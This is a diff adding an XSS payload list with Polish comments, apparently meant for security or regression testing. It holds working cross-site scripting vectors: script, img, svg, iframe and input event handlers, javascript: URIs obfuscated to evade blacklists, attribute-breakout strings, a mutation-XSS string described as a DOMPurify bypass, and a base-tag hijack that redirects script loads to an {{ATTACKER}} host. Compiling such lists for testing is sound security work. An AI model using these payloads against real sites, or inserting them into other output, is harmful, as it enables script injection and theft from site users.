@@ -1,0 +1,62 @@
+# === Detection canaries ===
+# Minimal probe — wykrywa reflected input bez wykonania
+'"<>
+# Quote/bracket fingerprint — sprawdza, które znaki są filtrowane
+"><svg/onload=confirm(1)>
+# Unique marker do grep w response
+xssTEST123
+
+# === Standard <script> ===
+# Klasyczny — działa poza kontekstami sanitizowanymi
+<script>alert(1)</script>
+# Bez znaczników kończących — często wystarczy
+<script>alert(1)//
+# Self-closing wariant
+<script/src=data:,alert(1)>
+
+# === Image vectors ===
+# Najpopularniejszy bypass <script> blacklisty
+<img src=x onerror=alert(1)>
+# Bez cudzysłowów (bypass quote-stripping)
+<img src=x onerror=alert(1)//
+# Z onload zamiast onerror
+<img src=1 onload=alert(1)>
+
+# === SVG vectors ===
+# Bypass filtrów blokujących <script> i <img>
+<svg onload=alert(1)>
+# SVG z animacją (omija część WAF)
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+# SVG + script element wewnątrz
+<svg><script>alert(1)</script></svg>
+
+# === Body/iframe/details ===
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<iframe srcdoc="<script>alert(1)</script>">
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# === Input/form vectors ===
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+
+# === Anchor / javascript: URI ===
+<a href="javascript:alert(1)">click</a>
+# Tab/newline w schemacie — bypass naive blacklist
+<a href="java&#9;script:alert(1)">x</a>
+
+# === Event handler bez tagu ===
+# Dla kontekstu gdzie HTML już jest, doklejamy event
+" onmouseover=alert(1) x="
+" autofocus onfocus=alert(1) x="
+
+# === Mutation XSS ===
+# DOMPurify bypass via mXSS (historyczny, zostawiamy do testów regresji)
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# === Base tag hijack ===
+# Przekierowuje względne <script src=...> na atakującego
+<base href="//{{ATTACKER}}/">
